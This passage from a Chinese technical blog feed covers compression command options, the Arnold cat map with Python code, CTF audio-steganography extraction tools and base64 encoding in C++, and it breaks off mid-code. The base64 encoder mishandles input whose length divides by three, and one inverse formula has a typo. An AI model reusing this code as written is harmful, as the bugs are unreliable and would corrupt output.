<td><code>-d</code></td>
<td>将压缩文件解压</td>
</tr>
<tr class="odd">
<td><code>-l</code></td>
<td>对每个压缩文件，显示下列字段：<br>压缩文件的大小；未压缩文件的大小；压缩比；未压缩文件的名字</td>
</tr>
<tr class="even">
<td><code>-r</code></td>
<td>递归式地查找指定目录并压缩其中的所有文件或者是解压缩</td>
</tr>
<tr class="odd">
<td><code>-t</code></td>
<td>测试，检查压缩文件是否完整</td>
</tr>
<tr class="even">
<td><code>-v</code></td>
<td>对每一个压缩和解压的文件，显示文件名和压缩比</td>
</tr>
<tr class="odd">
<td><code>-#</code></td>
<td>指定压缩比（1-9），系统缺省值为 6。</td>
</tr>
</tbody>
</table>
<h2 id="实例-3">实例</h2>
<ul>
<li><p>压缩</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">gzip filename</span><br></pre></td></tr></table></figure></li>
<li><p>解压</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">gzip -dv filename</span><br></pre></td></tr></table></figure></li>
<li><p>列出压缩文件信息</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">gzip -l filename</span><br></pre></td></tr></table></figure></li>
</ul>
<h1 id="lz4">lz4</h1>
<h2 id="简述-5">简述</h2>
<p><code>lz4</code> 在压缩率上略微逊色,
但是在解压速度上有着惊人的优势。</p>
<p>因为压缩时高效的多核利用，再加上惊艳的解压，<code>lz4</code>
已经在非常多重要场合使用了</p>
<h2 id="特征-4">特征</h2>
<p>后缀为 <code>.lz4</code></p>
<h2 id="命令-4">命令</h2>
<table>
<thead>
<tr class="header">
<th>命令</th>
<th>作用</th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td><code>-d</code></td>
<td>解压缩（默认为 <code>.lz4</code> 扩展名）</td>
</tr>
<tr class="even">
<td><code>-z</code></td>
<td>强制压缩</td>
</tr>
<tr class="odd">
<td><code>-f</code></td>
<td>覆盖输出而不提示</td>
</tr>
<tr class="even">
<td><code>-k</code></td>
<td>保留源文件（默认）</td>
</tr>
<tr class="odd">
<td><code>-v</code></td>
<td>详细模式</td>
</tr>
<tr class="even">
<td><code>-q</code></td>
<td>取消警告；指定两次也可以取消错误</td>
</tr>
<tr class="odd">
<td><code>-t</code></td>
<td>测试压缩文件完整性</td>
</tr>
<tr class="even">
<td><code>-m</code></td>
<td>多个输入文件（表示自动输出文件名）</td>
</tr>
<tr class="odd">
<td><code>-r</code></td>
<td>在目录上递归操作（也设置为-m）</td>
</tr>
<tr class="even">
<td><code>-l</code></td>
<td>使用旧格式压缩（Linux内核压缩）</td>
</tr>
<tr class="odd">
<td><code>-#</code></td>
<td>压缩效率（1-9），默认为1</td>
</tr>
</tbody>
</table>
<h2 id="实例-4">实例</h2>
<ul>
<li><p>压缩</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">lz4 filename</span><br></pre></td></tr></table></figure></li>
<li><p>解压</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">lz4 -d filename</span><br></pre></td></tr></table></figure></li>
</ul>
<h1 id="lzip">lzip</h1>
<h2 id="简述-6">简述</h2>
<p><code>lzip</code> 是一个无损的数据压缩和解压缩工具，它采用的是 LZMA
算法。</p>
<p>可以使用 Bandizip 解压缩</p>
<h2 id="特征-5">特征</h2>
<p>后缀为 <code>.lz</code></p>
<h2 id="实例-5">实例</h2>
<ul>
<li><p>压缩</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">lzip filename</span><br></pre></td></tr></table></figure></li>
<li><p>解压</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">lzip -d filename</span><br></pre></td></tr></table></figure></li>
</ul>
<h1 id="lzma">lzma</h1>
<h2 id="简述-7">简述</h2>
<p>LZMA，（Lempel-Ziv-Markov
chain-Algorithm的缩写），是一个Deflate和LZ77算法改良和优化后的压缩算法，开发者是Igor
Pavlov，2001年被首次应用于7-Zip压缩工具中，是
2001年以来得到发展的一个数据压缩算法。</p>
<p>Linux 命令行中可以直接调用 <code>lzma</code> 工具。</p>
<p>可以使用 Bandizip 解压缩。</p>
<h2 id="特征-6">特征</h2>
<p>后缀为 <code>.lzma</code></p>
<h2 id="命令-5">命令</h2>
<table>
<colgroup>
<col style="width: 6%">
<col style="width: 93%">
</colgroup>
<thead>
<tr class="header">
<th>命令</th>
<th>作用</th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td><code>-d</code></td>
<td>解压缩</td>
</tr>
<tr class="even">
<td><code>-f</code></td>
<td>强制解压/压缩，忽略一切问题，比如：目标文件已经存在，直接覆盖等</td>
</tr>
<tr class="odd">
<td><code>-k</code></td>
<td>不删除原始文件</td>
</tr>
<tr class="even">
<td><code>-t</code></td>
<td>测试，不解压</td>
</tr>
<tr class="odd">
<td><code>-v</code></td>
<td>显示进度等信息，</td>
</tr>
<tr class="even">
<td><code>-z</code></td>
<td>强制压缩</td>
</tr>
<tr class="odd">
<td><code>-#</code></td>
<td>压缩比（1-9），默认1</td>
</tr>
</tbody>
</table>
<h2 id="实例-6">实例</h2>
<ul>
<li><p>压缩</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">lzma test.tar</span><br></pre></td></tr></table></figure>
<p>默认删除文件，如果需要保留需要使用 <code>-k</code> 选项</p></li>
<li><p>解压</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">lzma -d test.tar.lzma</span><br></pre></td></tr></table></figure>
<p>默认删除文件，如果需要保留需要使用 <code>-k</code> 选项</p></li>
</ul>
<h1 id="lzop">lzop</h1>
<h2 id="简述-8">简述</h2>
<p><code>lzop</code> 工具最适合在注重压缩速度的场合，压缩文件时会新建
<code>.lzo</code> 文件，而原文件保持不变 (使用 <code>-U</code>
选项除外)</p>
<h2 id="特征-7">特征</h2>
<p>后缀为 <code>.lzo</code></p>
<h2 id="命令-6">命令</h2>
<table>
<colgroup>
<col style="width: 6%">
<col style="width: 93%">
</colgroup>
<thead>
<tr class="header">
<th>命令</th>
<th>作用</th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td><code>-d</code></td>
<td>解压缩</td>
</tr>
<tr class="even">
<td><code>-f</code></td>
<td>强制解压/压缩，忽略一切问题，比如：目标文件已经存在，直接覆盖等</td>
</tr>
<tr class="odd">
<td><code>-l</code></td>
<td>列出压缩文件的信息</td>
</tr>
<tr class="even">
<td><code>-U</code></td>
<td>删除原始文件</td>
</tr>
<tr class="odd">
<td><code>-t</code></td>
<td>测试，不解压</td>
</tr>
<tr class="even">
<td><code>-v</code></td>
<td>显示进度等信息，</td>
</tr>
<tr class="odd">
<td><code>-z</code></td>
<td>强制压缩</td>
</tr>
<tr class="even">
<td><code>-#</code></td>
<td>压缩比（1-9），默认1</td>
</tr>
</tbody>
</table>
<h2 id="实例-7">实例</h2>
<ul>
<li><p>压缩</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">lzop filename</span><br></pre></td></tr></table></figure></li>
<li><p>解压</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">lzop -dv filename.lzo</span><br></pre></td></tr></table></figure></li>
</ul>
<h1 id="tar">tar</h1>
<h2 id="简述-9">简述</h2>
<p>Linux <code>tar</code>（英文全拼：tape archive
）命令用于备份文件。</p>
<p><code>tar</code>
是用来建立，还原备份文件的工具程序，它可以加入，解开备份文件内的文件。</p>
<p>可以使用 Bandizip 解压缩</p>
<h2 id="特征-8">特征</h2>
<p>后缀为 <code>.tar</code></p>
<h2 id="命令-7">命令</h2>
<table>
<thead>
<tr class="header">
<th>命令</th>
<th>作用</th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td><code>-c</code></td>
<td>建立一个压缩文件</td>
</tr>
<tr class="even">
<td><code>-x</code></td>
<td>将压缩文件解压</td>
</tr>
<tr class="odd">
<td><code>-t</code></td>
<td>查看压缩文件详细信息</td>
</tr>
<tr class="even">
<td><code>-z</code></td>
<td>是否需要用 <code>gzip</code> 压缩</td>
</tr>
<tr class="odd">
<td><code>-j</code></td>
<td>是否需要用 <code>bzip2</code> 压缩</td>
</tr>
<tr class="even">
<td><code>-v</code></td>
<td>显示详细信息</td>
</tr>
<tr class="odd">
<td><code>-f</code></td>
<td>指定档名</td>
</tr>
<tr class="even">
<td><code>-p</code></td>
<td>使用原文件的原来属性</td>
</tr>
</tbody>
</table>
<h2 id="实例-8">实例</h2>
<ul>
<li><p>打包</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">tar -cvf test.tar test.txt</span><br></pre></td></tr></table></figure></li>
<li><p>以 <code>gzip</code> 压缩</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">tar -zcvf test.tar test.txt</span><br></pre></td></tr></table></figure></li>
<li><p>以 <code>bzip2</code> 压缩</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">tar -jcvf test.tar test.txt</span><br></pre></td></tr></table></figure></li>
<li><p>解压缩</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">tar -zxvf test.tar</span><br></pre></td></tr></table></figure>
<p>还可以指定压缩包内的某个文件打开</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">tar -zxvf test.tar test.txt</span><br></pre></td></tr></table></figure></li>
</ul>
<h1 id="xz">xz</h1>
<h2 id="简述-10">简述</h2>
<p><code>xz</code> 是一种压缩文件格式，采用LZMA SDK压缩，目标文件较
<code>gzip</code> 压缩文件小。</p>
<p>可以使用 Bandizip 解压缩。</p>
<h2 id="特征-9">特征</h2>
<p>文件后缀为 <code>.xz</code></p>
<h2 id="命令-8">命令</h2>
<table>
<thead>
<tr class="header">
<th>命令</th>
<th>作用</th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td><code>-d</code></td>
<td>解压缩</td>
</tr>
<tr class="even">
<td><code>-z</code></td>
<td>强制压缩</td>
</tr>
<tr class="odd">
<td><code>-f</code></td>
<td>覆盖输出而不提示</td>
</tr>
<tr class="even">
<td><code>-k</code></td>
<td>保留源文件（默认）</td>
</tr>
<tr class="odd">
<td><code>-v</code></td>
<td>详细模式</td>
</tr>
<tr class="even">
<td><code>-q</code></td>
<td>取消警告；指定两次也可以取消错误</td>
</tr>
<tr class="odd">
<td><code>-t</code></td>
<td>测试压缩文件完整性</td>
</tr>
<tr class="even">
<td><code>-m</code></td>
<td>多个输入文件（表示自动输出文件名）</td>
</tr>
<tr class="odd">
<td><code>-r</code></td>
<td>在目录上递归操作（也设置为-m）</td>
</tr>
<tr class="even">
<td><code>-l</code></td>
<td>使用旧格式压缩（Linux内核压缩）</td>
</tr>
<tr class="odd">
<td><code>-#</code></td>
<td>压缩效率（1-9），默认为6</td>
</tr>
</tbody>
</table>
<h2 id="实例-9">实例</h2>
<ul>
<li><p>压缩</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">xz test.txt</span><br></pre></td></tr></table></figure></li>
<li><p>解压</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">xz -d test.txt.xz</span><br></pre></td></tr></table></figure></li>
</ul>
]]></content>
      <tags>
        <tag>note</tag>
        <tag>linux</tag>
      </tags>
  </entry>
  <entry>
    <title>arnold cat 变换 (猫脸变换)</title>
    <url>//arnold-cat-note.html</url>
    <content><![CDATA[<h1 id="猫脸变换简述">猫脸变换简述</h1>
<p>利用Arnold变换（又称猫脸变换）可以对图像进行置乱，使得原本有意义的图像变成一张无意义的图像。该变换可以在其它图像处理前对图像做预处理，例如在数字盲水印嵌入前对水印进行置乱。也可以用于普通的图像加密。</p>
<p>通常一次Arnold变换达不到理想效果，需要对图像进行连续多次的变换。Arnold变换具有周期性，即对图像连续进行Arnold变换，最终又能得到原图像。变换的周期和图像的尺寸有关。</p>
<p>当图像是一张<strong>方形的图像</strong>时，Arnold变换存在<strong>逆变换</strong>。经过N次Arnold变换后的数据可以通过N次逆变换恢复数据。</p>
<p>Arnold变换不仅可以用于图像置乱，也可以用于其它数据的置乱和加密。</p>
<h1 id="原理">原理</h1>
<p><strong>置乱的实质是新位置与旧位置的映射，且该映射是一一对应的。</strong></p>
<p>下图是一次猫脸变换的示意图：</p>
<figure>
<img src="/arnold-cat-note/cat.png" alt="猫脸变换图解">
<figcaption aria-hidden="true">猫脸变换图解</figcaption>
</figure>
<ol type="1">
<li>先在 (a) 原图上做水平方向的错切</li>
<li>然后在 (b) 的基础上再做一次竖直方向的错切</li>
<li>对图像求模，即<strong>切割回填</strong>操作，便得到变换后的图像</li>
</ol>
<h1 id="公式">公式</h1>
<p>其中，<span class="math inline">\(a\)</span>和<span class="math inline">\(b\)</span>为给定参数，<span class="math inline">\(N\)</span>为图片大小 (默认图片为正方形)</p>
<h2 id="arnold-变换">Arnold 变换</h2>
<ul>
<li><p>矩阵公式 <span class="math display">\[
\left(\begin{matrix}
x&#39;\\
y&#39;
\end{matrix}\right)=
\left[\begin{matrix}
1&amp;a\\
b&amp;ab+1
\end{matrix}\right]
\left(\begin{matrix}
x\\
y
\end{matrix}\right)
mod(N)
\]</span></p></li>
<li><p>行列式公式 <span class="math display">\[
\begin{cases}
x&#39;=(x+ay)mod(N)\\
y&#39;=(bx+(ab+1)y)mod(N)
\end{cases}
\]</span></p></li>
</ul>
<h2 id="arnold-逆变换">Arnold 逆变换</h2>
<ul>
<li><p>矩阵公式 <span class="math display">\[
\left(\begin{matrix}
x\\
y
\end{matrix}\right)=
\left[\begin{matrix}
ab+1&amp;-a\\
-b&amp;1
\end{matrix}\right]
\left(\begin{matrix}
x&#39;\\
y&#39;
\end{matrix}\right)
mod(N)
\]</span></p></li>
<li><p>行列式公式 <span class="math display">\[
\begin{cases}
x=((ab+1)x&#39;-ay&#39;)mod(N)\\
y=(-bx&#39;+y)mod(N)
\end{cases}
\]</span></p></li>
</ul>
<h1 id="python-实现">Python 实现</h1>
<p>以下借助了 Pillow 库实现功能</p>
<p>其中 <code>a</code>、<code>b</code>
为给定参数，<code>shuffle_times</code> 为置乱次数，<code>reverse</code>
为是否进行逆变换。</p>
<p>需要注意的是，有时候 <code>a</code>、<code>b</code>
参数互换，得到的结果不一样。</p>
<p>更需要注意的是，有时候 <code>outdata[ny, nx] = indata[y, x]</code>
需要转换为
<code>outdata[nx, ny] = indata[x, y]</code>，这取决于原本进行变换的时候是如何读取像素的。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">arnold</span>(<span class="params">infile: <span class="built_in">str</span>, outfile: <span class="built_in">str</span> = <span class="literal">None</span>, a: <span class="built_in">int</span> = <span class="number">1</span>, b: <span class="built_in">int</span> = <span class="number">1</span>, shuffle_times: <span class="built_in">int</span> = <span class="number">1</span>, reverse: <span class="built_in">bool</span> = <span class="literal">False</span></span>) -&gt; <span class="literal">None</span>:</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    Arnold猫脸变换函数</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    Parameters:</span></span><br><span class="line"><span class="string">        infile - 输入图像路径</span></span><br><span class="line"><span class="string">        outfile - 输出图像路径</span></span><br><span class="line"><span class="string">        a - Anrold 变换参数</span></span><br><span class="line"><span class="string">        b - Anrold 变换参数</span></span><br><span class="line"><span class="string">        shuffle_times - 置乱次数</span></span><br><span class="line"><span class="string">        reverse - 逆变换</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    inimg = Image.<span class="built_in">open</span>(infile)</span><br><span class="line">    width, height = inimg.size</span><br><span class="line">    indata = inimg.load()</span><br><span class="line">    outimg = Image.new(inimg.mode, inimg.size)</span><br><span class="line">    outdata = outimg.load()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(shuffle_times):</span><br><span class="line">        <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(width):</span><br><span class="line">            <span class="keyword">for</span> y <span class="keyword">in</span> <span class="built_in">range</span>(height):</span><br><span class="line">                <span class="keyword">if</span> reverse:</span><br><span class="line">                    nx = ((a * b + <span class="number">1</span>) * x - a * y) % width</span><br><span class="line">                    ny = (y - b * x) % height</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    nx = (x + a * y) % width</span><br><span class="line">                    ny = (b * x + (a * b + <span class="number">1</span>) * y) % height</span><br><span class="line">                outdata[ny, nx] = indata[y, x]</span><br><span class="line">    </span><br><span class="line">    outimg.save(outfile <span class="keyword">if</span> outfile <span class="keyword">else</span> <span class="string">&quot;arnold_&quot;</span>+infile, inimg.<span class="built_in">format</span>)</span><br><span class="line"></span><br><span class="line">arnold(<span class="string">&quot;before.png&quot;</span>, <span class="string">&quot;encode.png&quot;</span>, <span class="number">9</span>, <span class="number">39</span>, <span class="number">1</span>)</span><br><span class="line">arnold(<span class="string">&quot;encode.png&quot;</span>, <span class="string">&quot;decode.png&quot;</span>, <span class="number">9</span>, <span class="number">39</span>, <span class="number">1</span>, <span class="literal">True</span>)</span><br></pre></td></tr></table></figure>
]]></content>
      <tags>
        <tag>note</tag>
      </tags>
  </entry>
  <entry>
    <title>音频取证笔记</title>
    <url>//audio-forensics-note.html</url>
    <content><![CDATA[<h1 id="音频取证">音频取证</h1>
<h2 id="简述">简述</h2>
<p>音频同样也是一个可以隐写其他数据的数据格式，常见的例如 lsb 隐写。</p>
<h2 id="deepsound">deepsound</h2>
<p>DeepSound 支持 wave、flac、wma、ape 和音频 CD
数据类型的隐写，并且可以保留文件名。</p>
<p>可以使用 John 对其进行密码爆破。</p>
<p>将音频拖入，再输入密码，即可提取出隐写的数据。</p>
<h2 id="dtmf">DTMF</h2>
<p>DTMF (dual-tone
multifrequency)，即双音多频，由高频群和低频群组成，高低频群各包含4个频率。一个高频信号和一个低频信号叠加组成一个组合信号，代表一个数字。DTMF
信号有16个编码，常用于老式电话，拨号音用的就是 DTMF 信号。</p>
<p>可以使用在线网站将音频进行转换：http://dialabc.com/sound/detect/index.html</p>
<p>也可以使用 Linux 软件 <code>dtmf2num</code>，使用 <code>apt</code>
包管理工具即可安装。</p>
<p>使用方式：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">dtmf2num audio.wav</span><br></pre></td></tr></table></figure>
<h2 id="lsb-隐写">lsb 隐写</h2>
<h2 id="morse-code">Morse-Code</h2>
<p>摩尔斯电码是只使用 0 和 1
两种状态的二进制代码，电报、短期通讯都是使用该种编码，主要由短促的点信号（代表
0）、保持一定时间的长信号（代表 1）和停顿组成。</p>
<p>Morse Code
的音频分析可以使用在线网站自动分析：https://morsecode.world/international/decoder/audio-decoder-expert.html</p>
<p>也可以使用 Linux 软件 <code>morse2ascii</code>，使用 <code>apt</code>
包管理工具即可安装。</p>
<p>使用方式：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">morse2ascii audio.wav</span><br></pre></td></tr></table></figure>
<h2 id="sstv">SSTV</h2>
<h2 id="频谱图隐写">频谱图隐写</h2>
<p>有时候会将关键信息隐藏在频谱图部分，可以使用 Audacity
软件查看频谱图部分得到隐藏信息。</p>
<p>需要注意的是，该种隐写会造成音乐听起来很奇怪。</p>
<h1 id="wav-取证">WAV 取证</h1>
<h2 id="silenteye">silenteye</h2>
<p>silenteye 支持对 wav 格式的隐写。</p>
<p>直接拖拽目标文件，点击 <code>Decode</code>
可以解密其中的隐藏数据。</p>
<p>同时可能它会使用 AES 对数据进行加密，需要进行密码的填写。</p>
<figure>
<img src="/audio-forensics-note/silenteye%20encrypted.png" alt="silenteye encrypted">
<figcaption aria-hidden="true">silenteye encrypted</figcaption>
</figure>
<h2 id="steghide">steghide</h2>
<p>可以对 wave 文件进行隐写和提取。</p>
<p>常常使用 <code>steghide info filename.wav</code>
对目标文件进行检测。</p>
<p>如果想要明文使用密码提取文件隐写数据，可以使用以下命令：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">steghide extract -sf filename -p password</span><br></pre></td></tr></table></figure>
<p>它会将隐写数据输出到文件当中。</p>
<p>可以使用 <a href="https://github.com/RickdeJager/stegseek">Stegseek</a>
软件进行快速且精确的爆破。</p>
<h2 id="wavsteg">WavSteg</h2>
<p>一个开源项目，使用 LSB 技术进行隐写数据的 Python3 脚本。（<a href="https://github.com/ragibson/Steganography">Github 主页</a>）</p>
<p>使用以下指令可以提取隐写数据，但缺点是要求大小精确。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">python3 WavSteg.py -r -s soundfile -o outputfile</span><br></pre></td></tr></table></figure>
<h1 id="mp3-取证">MP3 取证</h1>
<h2 id="mp3stego">Mp3stego</h2>
<p>Mp3stego 是一款较老的支持 mp3 数据格式隐写的软件，可以在<a href="https://www.petitcolas.net/steganography/mp3stego/">此站点</a>下载并了解更多。</p>
<p>它将需要隐写的数据加密后隐写进 mp3 文件中，故隐蔽性良好。</p>
<p>使用以下命令可以提取隐写数据：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">decode -X -P password svega_stego.mp3</span><br></pre></td></tr></table></figure>
<p>它将 <code>svega_stego.mp3</code> 解压为
<code>svega_stego.mp3.pcm</code>
并尝试提取隐藏信息，如果被解密则将保存在
<code>svega_stego.mp3.txt</code> 中。</p>
<p>加密命令：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">encode -E hidden_text.txt -P password svega.wav svega_stego.mp3</span><br></pre></td></tr></table></figure>
]]></content>
      <tags>
        <tag>note</tag>
        <tag>misc</tag>
        <tag>forensics</tag>
      </tags>
  </entry>
  <entry>
    <title>base64 笔记</title>
    <url>//base64-note.html</url>
    <content><![CDATA[<h1 id="base64-原理">Base64 原理</h1>
<p>Base64编码是使用64个可打印ASCII字符（A-Z、a-z、0-9、+、/）将任意字节序列数据编码成ASCII字符串，另有“=”符号用作后缀用途。</p>
<p>Base64将输入字符串按字节切分，取得每个字节对应的二进制值（若不足8比特则高位补0），然后将这些二进制数值串联起来，再按照6比特一组进行切分（因为2^6=64），最后一组若不足6比特则末尾补0。将每组二进制值转换成十进制，然后在上述表格中找到对应的符号并串联起来就是Base64编码结果。</p>
<p>由于二进制数据是按照8比特一组进行传输，因此Base64按照6比特一组切分的二进制数据必须是24比特的倍数（6和8的最小公倍数）。24比特就是3个字节，若原字节序列数据长度不是3的倍数时且剩下1个输入数据，则在编码结果后加2个=；若剩下2个输入数据，则在编码结果后加1个=。</p>
<p>完整的Base64定义可见RFC1421和RFC2045。因为Base64算法是将3个字节原数据编码为4个字节新数据，所以Base64编码后的数据比原始数据略长，为原来的4/3。在电子邮件中，根据RFC822规定，每76个字符，还需要加上一个回车换行。可以估算编码后数据长度大约为原长的135.1%。</p>
<p>Base64可用于任意数据的底层二进制数据编码，以应用于只能传输ASCII字符的场合。不过最常用于文本数据的处理传输，例如在MIME格式的电子邮件中，Base64可以用来编码邮件内容，方便在不同语言计算机间传输而不乱码，注意是传输而不是显示，例如在西欧地区计算机上使用UTF-8编码即可正常显示中文（安装有对应字库），但是它未必能正常传输中文，这时转换为Base64便无此顾虑。</p>
<p>Base64编码若无特别说明，通常约定非ASCII字符按照UTF-8字符集进行编码处理。</p>
<p>base64编码编码Uuencode编码类似，但base64将0~63之间的数字通过查表换字符，所以可能存在不用默认表而用另一个表进行base64编码加密</p>
<h1 id="c-实现">C++ 实现</h1>
<h2 id="加密---encode">加密 - Encode</h2>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function">string <span class="title">encode</span><span class="params">(<span class="type">const</span> string&amp; plain)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="comment">// 转码表</span></span><br><span class="line">	<span class="type">static</span> <span class="type">char</span> table[] = <span class="string">&quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&quot;</span>;</span><br><span class="line">	<span class="comment">// 计算加密字符数</span></span><br><span class="line">	<span class="type">size_t</span> count = plain.<span class="built_in">size</span>() / <span class="number">3</span>;</span><br><span class="line">	<span class="type">size_t</span> remain = plain.<span class="built_in">size</span>() % <span class="number">3</span>;</span><br><span class="line">	<span class="function">string <span class="title">result</span><span class="params">(count * <span class="number">4</span> + (remain ? <span class="number">4</span> : <span class="number">0</span>), <span class="number">0</span>)</span></span>;</span><br><span class="line">	<span class="type">size_t</span> i = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">while</span> (i != count)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="comment">// 3 bytes 为一组进行加密</span></span><br><span class="line">		<span class="comment">// 取第一个 byte 的前 6 位</span></span><br><span class="line">		result[i * <span class="number">4</span>] = table[plain[i * <span class="number">3</span>] &gt;&gt; <span class="number">2</span>];</span><br><span class="line">		<span class="comment">// 取第一个 byte 的后 2 位与第二个 byte 的前 4 位组合</span></span><br><span class="line">		result[i * <span class="number">4</span> + <span class="number">1</span>] = table[((plain[i * <span class="number">3</span>] &amp; <span class="number">0x3</span>) &lt;&lt; <span class="number">4</span>) | (plain[i * <span class="number">3</span> + <span class="number">1</span>] &gt;&gt; <span class="number">4</span>)];</span><br><span class="line">		<span class="comment">// 取第二个 byte 的后 4 位与第三个 byte 的前 2 位组合</span></span><br><span class="line">		result[i * <span class="number">4</span> + <span class="number">2</span>] = table[((plain[i * <span class="number">3</span> + <span class="number">1</span>] &amp; <span class="number">0xf</span>) &lt;&lt; <span class="number">2</span>) | (plain[i * <span class="number">3</span> + <span class="number">2</span>] &gt;&gt; <span class="number">6</span>)];</span><br><span class="line">		<span class="comment">// 取第三个 byte 的后 6 位</span></span><br><span class="line">		result[i * <span class="number">4</span> + <span class="number">3</span>] = table[plain[i * <span class="number">3</span> + <span class="number">2</span>] &amp; <span class="number">0x3f</span>];</span><br><span class="line"></span><br><span class="line">		<span class="comment">// 迭代至下一个 3 bytes</span></span><br><span class="line">		++i;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// 若多出 1 byte</span></span><br><span class="line">	<span class="keyword">if</span> (remain == <span class="number">1</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="comment">// 取 byte 前 6 位</span></span><br><span class="line">		result[i * <span class="number">4</span>] = table[plain[i * <span class="number">3</span>] &gt;&gt; <span class="number">2</span>];</span><br><span class="line">		<span class="comment">// 取 byte 后 2 位，剩余 4 位补 0</span></span><br><span class="line">		result[i * <span class="number">4</span> + <span class="number">1</span>] = table[(plain[i * <span class="number">3</span>] &amp; <span class="number">0x3</span>) &lt;&lt; <span class="number">4</span>];</span><br><span class="line">		<span class="comment">// 剩余补 &#x27;=&#x27; 凑满 4 的倍数长度</span></span><br><span class="line">		result[i * <span class="number">4</span> + <span class="number">2</span>] = result[i * <span class="number">4</span> + <span class="number">3</span>] = <span class="string">&#x27;=&#x27;</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">// 若多出 2 bytes</span></span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">	&#123;</span><br><span class="line">		<span class="comment">// 取第一个 byte 前 6 位</span></span><br><span class="line">		result[i * <span class="number">4</span>] = table[plain[i * <span class="number">3</span>] &gt;&gt; <span class="number">2</span>];</span><br><span class="line">		<span class="comment">// 取第一个 byte 的后 2 位与第二个 byte 的前 4 位组合</span></span><br><span class="line">		result[i * <span class="number">4</span> + <span class="number">1</span>] = table[((plain[i * <span class="number">3</span>] &amp; <span class="number">0x3</span>) &lt;&lt; <span class="number">4</span>) | (plain[i * <span class="number">3</span> + <span class="number">1</span>] &gt;&gt; <span class="number">4</span>)];</span><br><span class="line">		<span class="comment">// 取第二个 byte 的后 4 位，剩余 2 位补 0</span></span><br><span class="line">		result[i * <span class="number">4</span> + <span class="number">2</span>] = table[(plain[i * <span class="number">3</span> + <span class="number">1</span>] &amp; <span class="number">0xf</span>) &lt;&lt; <span class="number">2</span>];</span><br><span class="line">		<span class="comment">// 剩余补 &#x27;=&#x27; 凑满 4 的倍数长度</span></span><br><span class="line">		result[i * <span class="number">4</span> + <span class="number">3</span>] = <span class="string">&#x27;=&#x27;</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="解密---decode">解密 - Decode</h2>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function">string <span class="title">decode</span><span class="params">(<span class="type">const</span> string&amp; code)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="comment">// 映射表</span></span><br><span class="line">	<span class="type">static</span> <span class="type">char</span> table[] = &#123;</span><br><span class="line">		<span class="number">64</span>, <span class="number">64</span>, <span class="number">64</span>, <span class="number">64</span>, <span class="number">64</span>, <span class="number">64</span>, <span class="number">64</span>, <span class="number">64</span>, <span class="number">64</span>, <span class="number">64</span>, <span class="number">64</span>, <span class="number">64</span>, <span class="number">64</span>, <span class="number">64</span>, <span class="number">64</span>, <span class="number">64</span>,</span><br><span class="line">		<span class="number">64</span>, <span class="number">64</span>, <span class="number">64</span>, <span class="number">64</span>, <span class="number">64</span>, <span class="number">64</span>, <span class="number">64</span>, <span class="number">64</span>, <span class="number">64</span>, <span class="number">64</span>, <span class="number">64</span>, <span class="number">64</span>, <span class="number">64</span>, <span class="number">64</span>, <span class="number">64</span>, <span class="number">64</span>,</span><br><span class="line">		<span class="number">64</span>, <span class="number">64</span>, <span class="number">64</span>, <span class="number">64</span>, <span class="number">64</span>, <span class="number">64</span>, <span class="number">64</span>, <span class="number">64</span>, <span class="number">64</span>, <span class="number">64</span>, <span class="number">64</span>, <span class="number">62</span>, <span class="number">64</span>, <span class="number">64</span>, 